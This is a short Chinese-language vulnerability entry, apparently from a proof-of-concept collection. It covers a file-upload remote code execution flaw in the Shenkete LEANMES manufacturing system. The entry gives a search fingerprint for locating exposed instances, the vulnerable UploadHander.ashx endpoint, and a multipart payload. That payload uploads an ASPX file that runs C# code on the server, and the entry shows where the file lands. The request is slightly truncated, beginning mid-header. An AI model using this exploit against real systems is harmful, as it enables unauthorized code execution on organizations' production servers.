# 深科特LEANMES系统UploadHander存在文件上传致RCE漏洞

深科特LEANMES系统 ｜ 命令执行 ｜ —
- **指纹**：`title="LEAN MES - 用户登录"`
- **请求**：`POST /Handler/UploadHander.ashx?Action=ImportResultData HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
------WebKitFormBoundary
Content-Disposition: form-data; name="Filedata"; filename="test123.aspx."
<%@ Page Language="C#"%><% Response.Write("test123"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
------WebKitFormBoundary--
**上传定位：**
/UploadFiles/TemporaryFile/test123.aspx
```
- **响应特征**：200